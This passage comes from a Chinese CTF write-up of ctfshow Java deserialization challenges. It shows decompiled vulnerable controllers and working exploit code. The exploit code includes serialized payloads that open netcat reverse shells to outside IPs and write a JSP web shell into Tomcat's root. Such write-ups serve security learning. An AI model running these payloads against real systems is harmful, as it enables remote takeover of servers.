class="hljs-string">&quot;defaultViewResolver&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.JstlView&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/views/&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exposeContextBeansAsAttributes&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- IndexController--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.ctfshow.controller&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>包路径<code>com.ctfshow.controller</code>，控制器文件名<code>IndexController</code>，下这个<code>IndexController.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.controller;<br><br><span class="hljs-keyword">import</span> com.ctfshow.entity.User;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] userData = Base64.getDecoder().decode(request.getParameter(<span class="hljs-string">&quot;userData&quot;</span>));<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">safeObjectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(userData));<br>            user = (User)safeObjectInputStream.readUnshared();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User class can not unserialize&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            var6.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unserialize error&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;unserialize done, you username is &quot;</span> + user.getUsername();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在反序列化入口，再去下这个<code>User</code>类：<code>com.ctfshow.entity.User</code>包中的<code>user.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String address;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.getClass() == o.getClass()) &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)o;<br>            <span class="hljs-keyword">return</span> Objects.equals(<span class="hljs-built_in">this</span>.username, user.username) &amp;&amp; Objects.equals(<span class="hljs-built_in">this</span>.password, user.password);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.id, <span class="hljs-built_in">this</span>.username, <span class="hljs-built_in">this</span>.password&#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEmail</span><span class="hljs-params">(String email)</span> &#123;<br>        <span class="hljs-built_in">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != <span class="hljs-built_in">this</span>.username &amp;&amp; !<span class="hljs-built_in">this</span>.username.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> == <span class="hljs-built_in">this</span>.password || <span class="hljs-built_in">this</span>.password.isEmpty();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        input.defaultReadObject();<br>        Class.forName(<span class="hljs-built_in">this</span>.username).getMethod(<span class="hljs-built_in">this</span>.email, String.class).invoke(Class.forName(<span class="hljs-built_in">this</span>.username).getMethod(<span class="hljs-built_in">this</span>.password).invoke(Class.forName(<span class="hljs-built_in">this</span>.username)), <span class="hljs-built_in">this</span>.address);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重写的<code>readObject</code>存在命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setUsername(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        user.setPassword(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        user.setEmail(<span class="hljs-string">&quot;exec&quot;</span>);<br>        user.setAddress(<span class="hljs-string">&quot;nc 172.16.8.233 3333 -e /bin/sh&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        os.writeObject(user);<br>        os.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.println(payload);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="843"><a href="#843" class="headerlink" title="843"></a>843</h2><p>下载源码，<code>pom.xml</code>和<code>properties</code>没啥好东西，<code>config.class</code>存在命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> String execute;<br>    <span class="hljs-keyword">private</span> String[] args;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Config</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPath</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.path;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPath</span><span class="hljs-params">(String path)</span> &#123;<br>        <span class="hljs-built_in">this</span>.path = path;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExecute</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.execute;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setExecute</span><span class="hljs-params">(String execute)</span> &#123;<br>        <span class="hljs-built_in">this</span>.execute = execute;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String[] getArgs() &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.args;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setArgs</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-built_in">this</span>.args = args;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        input.defaultReadObject();<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-built_in">this</span>.args)).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>CookieFilter.class</code>存在反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;CookieFilter&quot;,</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-meta">@Order(Integer.MAX_VALUE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CookieFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CookieFilter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> CookieUtil.getCookieValue((HttpServletRequest)servletRequest, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != token &amp;&amp; token != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            token = URLDecoder.decode(token, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            token = token.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;+&quot;</span>);<br>            <span class="hljs-type">byte</span>[] base = Base64.getDecoder().decode(token.getBytes(StandardCharsets.UTF_8));<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base));<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)objectInputStream.readObject();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != user &amp;&amp; user.getUsername().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>                    servletRequest.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var9) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;guest&quot;</span>);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            objectOutputStream.writeObject(user);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cookieToken</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>            cookieToken = URLEncoder.encode(cookieToken, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            CookieUtil.setCookie((HttpServletRequest)servletRequest, (HttpServletResponse)servletResponse, <span class="hljs-string">&quot;token&quot;</span>, cookieToken);<br>        &#125;<br><br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化后的那个强转没啥影响，还是先序列化一个恶意的<code>Config</code>类序列化后传给<code>token</code>，再反序列化即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.setArgs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;%=Runtime.getRuntime().exec(request.getParameter(new String(new byte[]&#123;97&#125;)))%&gt;&#x27;&gt;/usr/local/tomcat/webapps/ROOT/1.jsp&quot;</span>&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(config);<br><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>        objectOutputStream.close();<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//rO0ABXNyACFjbGFzc2VzLmNvbS5jdGZzaG93LmVudGl0eS5Db25maWcAAAAAAAAAAQIABFsABGFyZ3N0ABNbTGphdmEvbGFuZy9TdHJpbmc7TAAHZXhlY3V0ZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4AAkwABHBhdGhxAH4AAnhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAXWVjaG8gJzwlPVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIobmV3IFN0cmluZyhuZXcgYnl0ZVtdezk3fSkpKSU+Jz4xLmpzcHB0AABxAH4ACQ==</span><br></code></pre></td></tr></table></figure><p>这里token写过去会报错，可以看到是类型转换出了问题，但对我们解题没啥影响：</p><p><img src="/img/843_1.png" alt="843_1"></p><p>然后<code>1.jsp?a=nc 43.132.254.165 9001 -e sh</code>即可。但这里有个问题，我不知道他这个当前运行目录<code>/usr/local/tomcat/webapps/ROOT/</code>是怎么拿的，但如果直接<code>&gt;1.jsp</code>还行不通。。。</p><p>上面是wp的解法，其实也不用这么麻烦，既然都能执行命令了直接在<code>ConfigTest</code>反弹shell就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span 